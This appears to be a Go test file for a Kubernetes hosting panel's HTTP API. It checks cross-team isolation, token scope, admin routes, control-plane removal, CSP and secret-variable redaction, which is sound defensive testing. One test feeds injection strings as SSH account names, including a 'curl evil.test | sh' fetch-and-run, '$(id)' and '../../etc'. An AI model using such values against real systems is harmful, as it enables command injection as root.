package api

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"skifity/internal/auth"
	"skifity/internal/config"
	"skifity/internal/crypto"
	"skifity/internal/events"
	"skifity/internal/settings"
	"skifity/internal/store"
	"skifity/web"
)

// Tenant isolation, tested against the real router.
//
// Authorization lives in one place on purpose — authorizeTeam, authorizeApp and
// their siblings — and "one place" is a claim rather than a fact until
// something checks it. These run every request through the router the panel
// actually serves, with a real database and a real keyring, so a handler that
// reaches the store without going through one of those is a failing test rather
// than a note in a review.
//
// The orchestrators are nil. Everything here is about who is allowed to ask,
// which is decided before any of them is reached.

type harness struct {
	t       *testing.T
	server  *httptest.Server
	api     *Server
	db      *store.DB
	auth    *auth.Service
	keyring *crypto.Keyring
}

func newHarness(t *testing.T) *harness {
	t.Helper()

	db, err := store.OpenMemory(t.Context())
	if err != nil {
		t.Fatalf("open database: %v", err)
	}
	t.Cleanup(func() { _ = db.Close() })

	keyring, err := crypto.InitKeyring(filepath.Join(t.TempDir(), "master.key"))
	if err != nil {
		t.Fatalf("init keyring: %v", err)
	}

	authService := auth.NewService(db, keyring, time.Hour, false)
	server := New(Options{
		Config:  config.Config{},
		DB:      db,
		Keyring: keyring,
		Auth:    authService,
		Hub:     events.NewHub(16),
		Logger:  slog.New(slog.DiscardHandler),
	})

	h := &harness{t: t, api: server, db: db, auth: authService, keyring: keyring}
	h.server = httptest.NewServer(server)
	t.Cleanup(h.server.Close)
	return h
}

// tenant is one team with a member, a token, and somewhere to put an app.
type tenant struct {
	user    store.User
	team    store.Team
	project store.Project
	env     store.Environment
	token   string
}

// newTenant creates a team nobody else is in.
func (h *harness) newTenant(name string) tenant {
	h.t.Helper()
	ctx := h.t.Context()

	user := store.User{Email: name + "@example.test", Name: name, PasswordHash: "x"}
	if err := h.db.CreateUser(ctx, &user); err != nil {
		h.t.Fatalf("create user: %v", err)
	}
	team := store.Team{Name: name, Slug: name}
	if err := h.db.CreateTeam(ctx, &team); err != nil {
		h.t.Fatalf("create team: %v", err)
	}
	if err := h.db.AddMember(ctx, team.ID, user.ID, store.RoleOwner); err != nil {
		h.t.Fatalf("add member: %v", err)
	}
	project := store.Project{TeamID: team.ID, Name: name, Slug: name}
	if err := h.db.CreateProject(ctx, &project); err != nil {
		h.t.Fatalf("create project: %v", err)
	}
	env := store.Environment{
		ProjectID: project.ID, Name: "production", Slug: "production",
		Namespace: name + "-production",
	}
	if err := h.db.CreateEnvironment(ctx, &env); err != nil {
		h.t.Fatalf("create environment: %v", err)
	}

	// A token bound to this team, which is the only shape the panel's form
	// offers and the one the middleware enforces.
	_, token, err := h.auth.CreateAPIToken(ctx, user.ID, team.ID, "test", "", 24*time.Hour)
	if err != nil {
		h.t.Fatalf("create token: %v", err)
	}
	return tenant{user: user, team: team, project: project, env: env, token: token}
}

// newMember adds a second person to an existing tenant's team, with their own
// token, so a test can act as somebody who is in the team but not its owner.
func (h *harness) newMember(of tenant, name string, role store.Role) tenant {
	h.t.Helper()
	ctx := h.t.Context()

	user := store.User{Email: name + "@example.test", Name: name, PasswordHash: "x"}
	if err := h.db.CreateUser(ctx, &user); err != nil {
		h.t.Fatalf("create user: %v", err)
	}
	if err := h.db.AddMember(ctx, of.team.ID, user.ID, role); err != nil {
		h.t.Fatalf("add member: %v", err)
	}
	_, token, err := h.auth.CreateAPIToken(ctx, user.ID, of.team.ID, "test", "", 24*time.Hour)
	if err != nil {
		h.t.Fatalf("create token: %v", err)
	}

	member := of
	member.user, member.token = user, token
	return member
}

// app creates an app in a tenant's environment.
func (h *harness) app(owner tenant, name string) store.App {
	h.t.Helper()
	app := store.App{EnvironmentID: owner.env.ID, Name: name, Slug: name, Replicas: 1}
	if err := h.db.CreateApp(h.t.Context(), &app); err != nil {
		h.t.Fatalf("create app: %v", err)
	}
	return app
}

// do makes a request as a tenant and returns the status and body.
func (h *harness) do(as tenant, method, path string, body any) (int, string) {
	h.t.Helper()

	var reader io.Reader
	if body != nil {
		encoded, err := json.Marshal(body)
		if err != nil {
			h.t.Fatalf("encode body: %v", err)
		}
		reader = bytes.NewReader(encoded)
	}
	req, err := http.NewRequestWithContext(context.Background(), method, h.server.URL+path, reader)
	if err != nil {
		h.t.Fatalf("build request: %v", err)
	}
	req.Header.Set("Content-Type", "application/json")
	if as.token != "" {
		req.Header.Set("Authorization", "Bearer "+as.token)
	}

	resp, err := h.server.Client().Do(req)
	if err != nil {
		h.t.Fatalf("%s %s: %v", method, path, err)
	}
	defer resp.Body.Close()
	answer, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, string(answer)
}

func TestOneTeamCannotReachAnother(t *testing.T) {
	h := newHarness(t)
	acme := h.newTenant("acme")
	other := h.newTenant("other")
	theirApp := h.app(other, "web")

	// Every shape of id the router accepts, asked for by the wrong team. The
	// answer is 404 rather than 403 throughout: a 403 would confirm the thing
	// exists, which is half of what somebody probing wants to know.
	for _, path := range []string{
		"/api/teams/" + other.team.ID,
		"/api/teams/" + other.team.ID + "/projects",
		"/api/teams/" + other.team.ID + "/servers",
		"/api/teams/" + other.team.ID + "/audit",
		"/api/teams/" + other.team.ID + "/git-sources",
		"/api/teams/" + other.team.ID + "/notifications",
		"/api/projects/" + other.project.ID,
		"/api/projects/" + other.project.ID + "/environments",
		"/api/projects/" + other.project.ID + "/variables",
		"/api/environments/" + other.env.ID,
		"/api/environments/" + other.env.ID + "/apps",
		"/api/environments/" + other.env.ID + "/databases",
		"/api/environments/" + other.env.ID + "/quota",
		"/api/apps/" + theirApp.ID,
		"/api/apps/" + theirApp.ID + "/status",
		"/api/apps/" + theirApp.ID + "/variables",
		"/api/apps/" + theirApp.ID + "/domains",
		"/api/apps/" + theirApp.ID + "/volumes",
		"/api/apps/" + theirApp.ID + "/deployments",
		"/api/apps/" + theirApp.ID + "/scaling",
		"/api/apps/" + theirApp.ID + "/advanced",
		"/api/apps/" + theirApp.ID + "/jobs",
	} {
		if status, body := h.do(acme, http.MethodGet, path, nil); status != http.StatusNotFound {
			t.Errorf("GET %s answered %d for another team, want 404\n%s", path, status, body)
		}
	}

	// And the writes.
	for _, w := range []struct {
		method, path string
		body         any
	}{
		{http.MethodPatch, "/api/apps/" + theirApp.ID, map[string]any{"name": "taken"}},
		{http.MethodDelete, "/api/apps/" + theirApp.ID, nil},
		{http.MethodPost, "/api/apps/" + theirApp.ID + "/deploy", map[string]any{}},
		{http.MethodPut, "/api/apps/" + theirApp.ID + "/source", map[string]any{}},
		{http.MethodPost, "/api/apps/" + theirApp.ID + "/restart", nil},
		{http.MethodPost, "/api/apps/" + theirApp.ID + "/run", map[string]any{"command": "id"}},
		{http.MethodPut, "/api/apps/" + theirApp.ID + "/variables", map[string]any{"key": "X", "value": "1"}},
		{http.MethodPut, "/api/apps/" + theirApp.ID + "/scaling", map[string]any{"replicas": 9}},
		{http.MethodPost, "/api/apps/" + theirApp.ID + "/domains", map[string]any{"hostname": "x.example.test"}},
		{http.MethodPost, "/api/environments/" + other.env.ID + "/apps", map[string]any{"name": "sneaky", "image": "nginx"}},
		{http.MethodPost, "/api/teams/" + other.team.ID + "/detect", map[string]any{"repo_url": "https://github.com/a/b"}},
		{http.MethodPost, "/api/teams/" + other.team.ID + "/detect-upload", map[string]any{}},
		{http.MethodDelete, "/api/environments/" + other.env.ID, nil},
	} {
		if status, body := h.do(acme, w.method, w.path, w.body); status != http.StatusNotFound {
			t.Errorf("%s %s answered %d for another team, want 404\n%s", w.method, w.path, status, body)
		}
	}

	// The same requests against their own team are not refused, or the test
	// above would pass with authorization that refuses everybody.
	if status, body := h.do(acme, http.MethodGet, "/api/teams/"+acme.team.ID, nil); status != http.StatusOK {
		t.Fatalf("a team could not read itself: %d\n%s", status, body)
	}
}

func TestUnlinkingADatabaseAuthorizesTheAppToo(t *testing.T) {
	// Unlinking reaches into two resources, and only the database was checked.
	// An app id from another team reached the manager, which removes no
	// variable it does not own but does re-apply that app's configuration to
	// the cluster: a rollout somebody else's team did not ask for.
	h := newHarness(t)
	acme := h.newTenant("acme")
	other := h.newTenant("other")
	theirApp := h.app(other, "web")

	database := store.Database{
		EnvironmentID: acme.env.ID, Name: "cache", Slug: "cache", Engine: "redis",
	}
	if err := h.db.CreateDatabase(t.Context(), &database); err != nil {
		t.Fatalf("create database: %v", err)
	}

	status, body := h.do(acme, http.MethodDelete,
		"/api/databases/"+database.ID+"/link/"+theirApp.ID, nil)
	if status != http.StatusNotFound {
		t.Fatalf("unlinking another team's app answered %d, want 404\n%s", status, body)
	}

	// Linking has always checked, and still does.
	status, body = h.do(acme, http.MethodPost, "/api/databases/"+database.ID+"/link",
		map[string]any{"app_id": theirApp.ID})
	if status != http.StatusNotFound {
		t.Fatalf("linking another team's app answered %d, want 404\n%s", status, body)
	}
}

func TestATokenIsBoundToOneTeam(t *testing.T) {
	// A token is issued for one team — the panel's form has no other option —
	// and the binding is enforced in the middleware rather than per handler.
	h := newHarness(t)
	acme := h.newTenant("acme")

	// The same person, in a second team, holding a token made for the first.
	second := store.Team{Name: "second", Slug: "second"}
	if err := h.db.CreateTeam(t.Context(), &second); err != nil {
		t.Fatalf("create team: %v", err)
	}
	if err := h.db.AddMember(t.Context(), second.ID, acme.user.ID, store.RoleOwner); err != nil {
		t.Fatalf("add member: %v", err)
	}

	if status, body := h.do(acme, http.MethodGet, "/api/teams/"+second.ID, nil); status != http.StatusNotFound {
		t.Fatalf("a token made for one team reached another: %d\n%s", status, body)
	}
	if status, _ := h.do(acme, http.MethodGet, "/api/teams/"+acme.team.ID, nil); status != http.StatusOK {
		t.Fatal("the token cannot reach the team it was made for")
	}
}

func TestAReadOnlyTokenCannotWrite(t *testing.T) {
	h := newHarness(t)
	acme := h.newTenant("acme")
	ownApp := h.app(acme, "web")

	_, readOnly, err := h.auth.CreateAPIToken(t.Context(), acme.user.ID, acme.team.ID,
		"read-only", auth.ScopeRead, 24*time.Hour)
	if err != nil {
		t.Fatalf("create token: %v", err)
	}
	reader := tenant{token: readOnly}

	if status, body := h.do(reader, http.MethodGet, "/api/apps/"+ownApp.ID, nil); status != http.StatusOK {
		t.Fatalf("a read-only token cannot read: %d\n%s", status, body)
	}
	// Every write, including the one that would issue a token without a scope.
	for _, w := range []struct {
		method, path string
		body         any
	}{
		{http.MethodPatch, "/api/apps/" + ownApp.ID, map[string]any{"name": "renamed"}},
		{http.MethodDelete, "/api/apps/" + ownApp.ID, nil},
		{http.MethodPost, "/api/me/tokens", map[string]any{"name": "wider"}},
	} {
		if status, body := h.do(reader, w.method, w.path, w.body); status != http.StatusForbidden {
			t.Errorf("%s %s with a read-only token answered %d, want 403\n%s",
				w.method, w.path, status, body)
		}
	}
}

func TestNothingIsReachableWithoutCredentials(t *testing.T) {
	h := newHarness(t)
	acme := h.newTenant("acme")
	ownApp := h.app(acme, "web")
	anonymous := tenant{}

	for _, path := range []string{
		"/api/me",
		"/api/teams",
		"/api/teams/" + acme.team.ID,
		"/api/apps/" + ownApp.ID,
		"/api/settings",
		"/api/metrics",
		"/api/security/recovery-key",
	} {
		status, body := h.do(anonymous, http.MethodGet, path, nil)
		if status != http.StatusUnauthorized {
			t.Errorf("GET %s answered %d without credentials, want 401\n%s", path, status, body)
		}
	}

	// The handful that are open on purpose, so "401 everywhere" is not what
	// this test is really asserting.
	for _, path := range []string{"/api/health", "/api/ready", "/api/meta", "/api/setup/status"} {
		if status, body := h.do(anonymous, http.MethodGet, path, nil); status != http.StatusOK {
			t.Errorf("GET %s answered %d, want it open\n%s", path, status, body)
		}
	}
}

func TestAdminOnlyRoutesRefuseAnOrdinaryAccount(t *testing.T) {
	// Settings, the master key and the upgrade are the panel's own, not a
	// team's. Owning every team is not the same as administering the box.
	h := newHarness(t)
	acme := h.newTenant("acme")

	for _, path := range []string{
		"/api/settings",
		"/api/components",
		"/api/security/recovery-key",
		"/api/upgrade",
		"/api/metrics",
	} {
		if status, body := h.do(acme, http.MethodGet, path, nil); status != http.StatusForbidden {
			t.Errorf("GET %s answered %d for a non-administrator, want 403\n%s", path, status, body)
		}
	}
}

func TestAServerAccountNameIsRefusedIfItIsNotOne(t *testing.T) {
	// The account names a home directory and is handed to chown in a script
	// that runs as root on the server being added. Everything in those scripts
	// is quoted; this is the other half.
	h := newHarness(t)
	acme := h.newTenant("acme")

	for _, name := range []string{
		"root; curl http://evil.test/s | sh",
		"$(id)",
		"a b",
		"../../etc",
		"UPPER",
		"0numeric",
		"reallylongaccountnamethatnosystemwouldeverhaveproduced",
	} {
		_, body := h.do(acme, http.MethodPost, "/api/teams/"+acme.team.ID+"/servers",
			map[string]any{"host": "203.0.113.10", "ssh_user": name, "password": "x"})
		if !strings.Contains(body, "not a valid account name") {
			t.Errorf("ssh_user %q was accepted\n%s", name, body)
		}
	}

	// The ones a distribution actually produces get past the name check. The
	// request then fails for want of a cluster, which is the point: it got
	// further than the name.
	for _, name := range []string{"root", "ubuntu", "ec2-user", "deploy_1", "a.b"} {
		_, body := h.do(acme, http.MethodPost, "/api/teams/"+acme.team.ID+"/servers",
			map[string]any{"host": "203.0.113.10", "ssh_user": name, "password": "x"})
		if strings.Contains(body, "not a valid account name") {
			t.Errorf("ssh_user %q was refused as a bad name\n%s", name, body)
		}
	}
}

// fakeCluster answers only what the removal guard asks. Everything else in the
// Cluster port is unreachable from these tests and says so if it is reached.
type fakeCluster struct {
	Cluster
	controlPlanes int
	err           error
}

func (f fakeCluster) ControlPlaneCount(context.Context) (int, error) {
	return f.controlPlanes, f.err
}

// withCluster rebuilds the harness's server with a cluster attached, and keeps
// the new server reachable as h.api so a test can call a method on it directly.
func (h *harness) withCluster(c Cluster) {
	h.t.Helper()
	h.api = New(Options{
		DB: h.db, Keyring: h.keyring, Auth: h.auth,
		Hub: events.NewHub(16), Logger: slog.New(slog.DiscardHandler),
		Cluster: c,
	})
	h.server.Config.Handler = h.api
}

// withDatabases rebuilds the harness's server with a database manager attached,
// for the handlers that refuse to act without one.
func (h *harness) withDatabases(m DatabaseManager) {
	h.t.Helper()
	h.server.Config.Handler = New(Options{
		DB: h.db, Keyring: h.keyring, Auth: h.auth,
		Hub: events.NewHub(16), Logger: slog.New(slog.DiscardHandler),
		Databases: m,
	})
}

func TestRemovingTheLastControlPlaneIsRefused(t *testing.T) {
	// The guard used to count rows in one team's table. That is not how many
	// nodes run the cluster: a panel installed by install.sh has no row for the
	// node it runs on, and a panel with two teams splits the rest between them.
	// The number was low, so it refused safe removals — and when it reached
	// zero it permitted the one that deletes Kubernetes, every app, and the
	// panel answering the request.
	cases := []struct {
		name          string
		controlPlanes int
		err           error
		wantCode      string
	}{
		{"the only one", 1, nil, "cluster.last_control_plane"},
		{"two would leave one", 2, nil, "cluster.quorum_risk"},
		{"three would leave two", 3, nil, "cluster.quorum_risk"},
		// Four leaves three, which is a working, fault-tolerant cluster. The
		// old count refused this.
		{"four leaves a healthy three", 4, nil, ""},
		// If the cluster cannot say, the panel cannot prove it is safe.
		{"unreachable", 0, errors.New("no route to host"), "cluster.control_plane_unverifiable"},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			h := newHarness(t)
			acme := h.newTenant("acme")
			h.withCluster(fakeCluster{controlPlanes: c.controlPlanes, err: c.err})

			server := store.Server{
				TeamID: acme.team.ID, Name: "node-1", Host: "203.0.113.10",
				SSHPort: 22, SSHUser: "root", Role: "control-plane",
			}
			if err := h.db.CreateServer(t.Context(), &server); err != nil {
				t.Fatalf("create server: %v", err)
			}

			_, body := h.do(acme, http.MethodDelete, "/api/servers/"+server.ID, nil)
			if c.wantCode == "" {
				if strings.Contains(body, "cluster.quorum_risk") ||
					strings.Contains(body, "cluster.last_control_plane") {
					t.Fatalf("a safe removal was refused\n%s", body)
				}
				return
			}
			if !strings.Contains(body, c.wantCode) {
				t.Fatalf("want %s\n%s", c.wantCode, body)
			}
		})
	}
}

func TestAWorkerIsRemovableWhateverTheClusterSays(t *testing.T) {
	// The guard is about the nodes that run the cluster. A worker is not one,
	// and a cluster that cannot be reached is not a reason to keep a dead
	// worker in the list.
	h := newHarness(t)
	acme := h.newTenant("acme")
	h.withCluster(fakeCluster{err: errors.New("no route to host")})

	server := store.Server{
		TeamID: acme.team.ID, Name: "worker-1", Host: "203.0.113.20",
		SSHPort: 22, SSHUser: "root", Role: "worker",
	}
	if err := h.db.CreateServer(t.Context(), &server); err != nil {
		t.Fatalf("create server: %v", err)
	}

	_, body := h.do(acme, http.MethodDelete, "/api/servers/"+server.ID, nil)
	for _, refusal := range []string{"cluster.quorum_risk", "cluster.last_control_plane", "cluster.control_plane_unverifiable"} {
		if strings.Contains(body, refusal) {
			t.Fatalf("a worker was refused by the control plane guard\n%s", body)
		}
	}
}

// TestAnAppIsCreatedWithTheVariablesItWasGiven: a Compose service is mostly its
// environment, and the form had nowhere to put it. Creating the app and then
// setting the variables afterwards would start it once without them, which for
// anything with a database URL means a first deploy that crashes.
func TestAnAppIsCreatedWithTheVariablesItWasGiven(t *testing.T) {
	h := newHarness(t)
	acme := h.newTenant("acme")

	status, body := h.do(acme, http.MethodPost, "/api/environments/"+acme.env.ID+"/apps", map[string]any{
		"name":      "shop",
		"repo_url":  "https://github.com/acme/shop",
		"variables": map[string]string{"DATABASE_URL": "postgres://db:5432/shop", "NODE_ENV": "production"},
	})
	if status != http.StatusCreated {
		t.Fatalf("create app: %d %s", status, body)
	}
	var answer struct {
		App store.App `json:"app"`
	}
	if err := json.Unmarshal([]byte(body), &answer); err != nil {
		t.Fatalf("decode app: %v", err)
	}
	created := answer.App

	rows, err := h.db.ListVariables(t.Context(), created.ID)
	if err != nil {
		t.Fatalf("list variables: %v", err)
	}
	if len(rows) != 2 {
		t.Fatalf("the app was created with %d variables, want 2", len(rows))
	}
	// And they are sealed like any other variable, not stored as they arrived.
	for _, row := range rows {
		if strings.Contains(row.Sealed, "postgres://") {
			t.Fatalf("%s was stored in the clear", row.Key)
		}
		plaintext, err := h.keyring.Open(row.Sealed, variableContext(created.ID, row.Key))
		if err != nil {
			t.Fatalf("open %s: %v", row.Key, err)
		}
		if row.Key == "DATABASE_URL" && string(plaintext) != "postgres://db:5432/shop" {
			t.Fatalf("DATABASE_URL came back as %q", plaintext)
		}
	}
}

// A key the cluster could not carry has to stop the request. An app that comes
// up with half its configuration looks like a broken app, and the reason is
// nowhere on screen.
func TestAnAppIsNotCreatedWithAVariableTheClusterCannotCarry(t *testing.T) {
	h := newHarness(t)
	acme := h.newTenant("acme")

	status, body := h.do(acme, http.MethodPost, "/api/environments/"+acme.env.ID+"/apps", map[string]any{
		"name":      "shop",
		"repo_url":  "https://github.com/acme/shop",
		"variables": map[string]string{"not a key": "x"},
	})
	if status != http.StatusBadRequest {
		t.Fatalf("an unusable variable name was accepted: %d %s", status, body)
	}
}

// A Compose file is several services and an app runs one. The API used to
// accept "compose" as a source, store it, and then deploy the app as a Git app
// with no repository.
func TestAnAppCannotBeCreatedFromAComposeFile(t *testing.T) {
	h := newHarness(t)
	acme := h.newTenant("acme")

	status, body := h.do(acme, http.MethodPost, "/api/environments/"+acme.env.ID+"/apps", map[string]any{
		"name":        "stack",
		"source_type": "compose",
	})
	if status != http.StatusBadRequest {
		t.Fatalf("an app was created from a Compose file: %d %s", status, body)
	}
	if !strings.Contains(body, "app per service") {
		t.Errorf("the refusal does not say what to do instead: %s", body)
	}
}

// database creates a database in a tenant's environment.
func (h *harness) database(owner tenant, name string) store.Database {
	h.t.Helper()
	record := store.Database{
		EnvironmentID: owner.env.ID, Name: name, Slug: name,
		Engine: "postgres", Status: "running",
	}
	if err := h.db.CreateDatabase(h.t.Context(), &record); err != nil {
		h.t.Fatalf("create database: %v", err)
	}
	return record
}

// node creates a server in a tenant's team. Not `server`: the harness
// already has one of those, and it is the HTTP one.
func (h *harness) node(owner tenant, name string) store.Server {
	h.t.Helper()
	record := store.Server{
		TeamID: owner.team.ID, Name: name, Host: "198.51.100.10",
		SSHPort: 22, SSHUser: "root", Role: "control-plane", Status: "ready",
	}
	if err := h.db.CreateServer(h.t.Context(), &record); err != nil {
		h.t.Fatalf("create server: %v", err)
	}
	return record
}

// TestTheContentSecurityPolicyAllowsTheScriptThatShips.
//
// index.html carries one inline script: it reads the stored theme and sets the
// dark class before the first paint, so a dark-mode user never sees a white
// flash. `script-src 'self'` refused to run it, in production only — the policy
// is not set in dev mode, which is why the flash it exists to prevent was
// visible everywhere except where anybody was working.
//
// The hash is read out of the embedded file rather than written down beside it,
// and this checks that the policy actually names every inline script in it: a
// hash written down beside a script goes stale the first time somebody edits
// the script and does not think about the policy.
func TestTheContentSecurityPolicyAllowsTheScriptThatShips(t *testing.T) {
	h := newHarness(t)

	response, err := h.server.Client().Get(h.server.URL + "/")
	if err != nil {
		t.Fatalf("fetch the panel: %v", err)
	}
	defer response.Body.Close()

	policy := response.Header.Get("Content-Security-Policy")
	if policy == "" {
		t.Skip("no policy is set in this configuration, so there is nothing to check")
	}
	// Only script-src. style-src carries 'unsafe-inline' on purpose — Tailwind
	// sets its theme variables on the document element — and checking the whole
	// header instead of the one directive reports that as a failure.
	var scriptSrc string
	for _, directive := range strings.Split(policy, ";") {
		if directive = strings.TrimSpace(directive); strings.HasPrefix(directive, "script-src ") {
			scriptSrc = directive
		}
	}
	if scriptSrc == "" {
		t.Fatalf("the policy has no script-src: %s", policy)
	}

	hashes := web.InlineScriptHashes()
	if len(hashes) == 0 {
		// A build with no frontend embedded, or a frontend with no inline
		// script. Both are fine; silently passing when there *is* one is not.
		t.Skip("the embedded index.html has no inline script")
	}
	for _, hash := range hashes {
		if !strings.Contains(scriptSrc, hash) {
			t.Errorf("the policy does not allow an inline script that ships in index.html.\n"+
				"missing: %s\nscript-src: %s", hash, scriptSrc)
		}
	}
	if strings.Contains(scriptSrc, "'unsafe-inline'") {
		t.Error("script-src allows 'unsafe-inline', which is what the hashes exist to avoid")
	}
}

// Nothing used to stop a member of any team pointing an app at the panel's own
// hostname. Two Ingresses with the same host in different namespaces is not an
// error Kubernetes reports: the ingress controller picks one, and which one
// survives a restart is not something anybody decided. The app would then
// receive the requests a browser sends to the panel, sign-in cookie included.
func TestAnAppCannotClaimThePanelsOwnHostname(t *testing.T) {
	h := newHarness(t)
	h.api.cfg.PublicURL = "https://panel.example.com"
	acme := h.newTenant("acme")
	app := h.app(acme, "web")

	// The panel's address, in each of the shapes somebody might type it.
	for _, typed := range []string{
		"panel.example.com",
		"PANEL.example.com",
		"https://panel.example.com",
		"https://panel.example.com/",
		"panel.example.com.",
	} {
		status, body := h.do(acme, "POST", "/api/apps/"+app.ID+"/domains",
			map[string]any{"hostname": typed})
		if status != http.StatusConflict {
			t.Errorf("%q was accepted with %d: %s", typed, status, body)
		}
		if !strings.Contains(body, "domain.is_the_panel") {
			t.Errorf("%q was refused for the wrong reason: %s", typed, body)
		}
	}

	// A subdomain of it is somebody's own business and must still work.
	if status, body := h.do(acme, "POST", "/api/apps/"+app.ID+"/domains",
		map[string]any{"hostname": "shop.panel.example.com"}); status != http.StatusCreated {
		t.Errorf("a subdomain was refused with %d: %s", status, body)
	}
}

// The panel also learns its address from Settings, which is where an operator
// puts it when the installer did not.
func TestTheSettingProtectsThePanelToo(t *testing.T) {
	h := newHarness(t)
	acme := h.newTenant("acme")
	app := h.app(acme, "web")

	if err := h.db.SetSetting(t.Context(), settings.KeyPanelURL,
		"https://control.example.com", false, ""); err != nil {
		t.Fatalf("SetSetting: %v", err)
	}
	status, body := h.do(acme, "POST", "/api/apps/"+app.ID+"/domains",
		map[string]any{"hostname": "control.example.com"})
	if status != http.StatusConflict {
		t.Errorf("the configured panel address was claimable: %d %s", status, body)
	}
}

// A secret variable's value never leaves this panel.
//
// The promise is made in three places — the API's own comment, the note the MCP
// server returns to a model, and the interface — and it was kept by one line in
// one handler with nothing pinning it. A secret handed to a browser is bad; the
// same secret handed to a language model is somebody else's log file.
//
// The value used here is distinctive on purpose: the check is that it appears
// nowhere in the answer, not that one field happens to be empty.
func TestASecretVariablesValueNeverLeavesThePanel(t *testing.T) {
	h := newHarness(t)
	acme := h.newTenant("acme")

	const secret = "s3cr3t-value-nothing-else-would-produce"
	status, body := h.do(acme, http.MethodPost, "/api/environments/"+acme.env.ID+"/apps", map[string]any{
		"name": "shop", "repo_url": "https://github.com/acme/shop",
	})
	if status != http.StatusCreated {
		t.Fatalf("create app: %d %s", status, body)
	}
	var answer struct {
		App store.App `json:"app"`
	}
	if err := json.Unmarshal([]byte(body), &answer); err != nil {
		t.Fatalf("decode app: %v", err)
	}
	app := answer.App

	status, body = h.do(acme, http.MethodPut, "/api/apps/"+app.ID+"/variables", map[string]any{
		"key": "STRIPE_KEY", "value": secret, "is_secret": true,
	})
	if status >= 300 {
		t.Fatalf("set the secret: %d %s", status, body)
	}

	// Reading them back, which is what the interface and the MCP server do.
	status, body = h.do(acme, http.MethodGet, "/api/apps/"+app.ID+"/variables", nil)
	if status != http.StatusOK {
		t.Fatalf("list variables: %d %s", status, body)
	}
	if strings.Contains(body, secret) {
		t.Fatalf("the secret's value came back from the API:\n%s", body)
	}
	if !strings.Contains(body, "STRIPE_KEY") {
		t.Fatalf("the variable is not listed at all, so this test proves nothing:\n%s", body)
	}

	// And nowhere else a person or a model can reach it either.
	for _, path := range []string{
		"/api/apps/" + app.ID,
		"/api/environments/" + acme.env.ID + "/apps",
		"/api/teams/" + acme.team.ID + "/export",
	} {
		status, body := h.do(acme, http.MethodGet, path, nil)
		if status >= 300 {
			continue
		}
		if strings.Contains(body, secret) {
			t.Errorf("the secret's value came back from %s:\n%s", path, body)
		}
	}

	// It is still there, sealed, so this is a promise about what is shown and
	// not a variable that was quietly dropped.
	rows, err := h.db.ListVariables(t.Context(), app.ID)
	if err != nil {
		t.Fatalf("list variables: %v", err)
	}
	if len(rows) != 1 {
		t.Fatalf("%d variables stored, want 1", len(rows))
	}
	plaintext, err := h.keyring.Open(rows[0].Sealed, variableContext(app.ID, rows[0].Key))
	if err != nil {
		t.Fatalf("open the secret: %v", err)
	}
	if string(plaintext) != secret {
		t.Errorf("the stored value is %q", plaintext)
	}
}

// Saying nothing about a secret is not saying "not a secret".
//
// Every path that leaves the field out is a path a secret arrives by: a pasted
// .env file, the MCP server when a model omits the flag, the CLI without
// --secret. They all used to store the value as an ordinary variable, which the
// API then handed back to anybody on the team, to the browser, and to a model.
func TestSilenceAboutASecretKeepsItSecret(t *testing.T) {
	h := newHarness(t)
	acme := h.newTenant("acme")

	status, body := h.do(acme, http.MethodPost, "/api/environments/"+acme.env.ID+"/apps", map[string]any{
		"name": "shop", "repo_url": "https://github.com/acme/shop",
		// A pasted .env on the new-app form arrives as a plain map.
		"variables": map[string]string{
			"OPENAI_API_KEY": "sk-proj-abcdefghijklmnopqrstuvwxyz0123",
			"NODE_ENV":       "production",
		},
	})
	if status != http.StatusCreated {
		t.Fatalf("create app: %d %s", status, body)
	}
	var answer struct {
		App store.App `json:"app"`
	}
	if err := json.Unmarshal([]byte(body), &answer); err != nil {
		t.Fatalf("decode app: %v", err)
	}
	app := answer.App

	put := func(fields map[string]any) {
		t.Helper()
		status, body := h.do(acme, http.MethodPut, "/api/apps/"+app.ID+"/variables", fields)
		if status >= 300 {
			t.Fatalf("set %v: %d %s", fields["key"], status, body)
		}
	}
	secret := func(key string) bool {
		t.Helper()
		rows, err := h.db.ListVariables(t.Context(), app.ID)
		if err != nil {
			t.Fatalf("list variables: %v", err)
		}
		for _, row := range rows {
			if row.Key == key {
				return row.IsSecret
			}
		}
		t.Fatalf("%s is not set at all", key)
		return false
	}

	if !secret("OPENAI_API_KEY") {
		t.Error("an API key pasted into the new-app form was stored as an ordinary value")
	}
	if secret("NODE_ENV") {
		t.Error("NODE_ENV was made a secret, so nobody can read back something harmless")
	}

	// A connection string, whose password is in the value and not the name.
	put(map[string]any{"key": "DATABASE_URL", "value": "postgres://shop:hunter2@db:5432/shop"})
	if !secret("DATABASE_URL") {
		t.Error("a connection string with a password in it was stored as an ordinary value")
	}

	// The MCP case: a secret overwritten by a caller that left the flag out.
	put(map[string]any{"key": "PAYMENTS", "value": "first", "is_secret": true})
	put(map[string]any{"key": "PAYMENTS", "value": "second"})
	if !secret("PAYMENTS") {
		t.Error("overwriting a secret without saying anything turned it into an ordinary value")
	}

	// An explicit answer is still obeyed. It only reveals the value just sent.
	put(map[string]any{"key": "PAYMENTS", "value": "third", "is_secret": false})
	if secret("PAYMENTS") {
		t.Error("an explicit is_secret=false was ignored")
	}

	// And the value of a secret still never comes back.
	status, body = h.do(acme, http.MethodGet, "/api/apps/"+app.ID+"/variables", nil)
	if status != http.StatusOK {
		t.Fatalf("list: %d %s", status, body)
	}
	for _, leaked := range []string{"sk-proj-abcdefghijklmnopqrstuvwxyz0123", "hunter2"} {
		if strings.Contains(body, leaked) {
			t.Errorf("%q came back from the API", leaked)
		}
	}
}
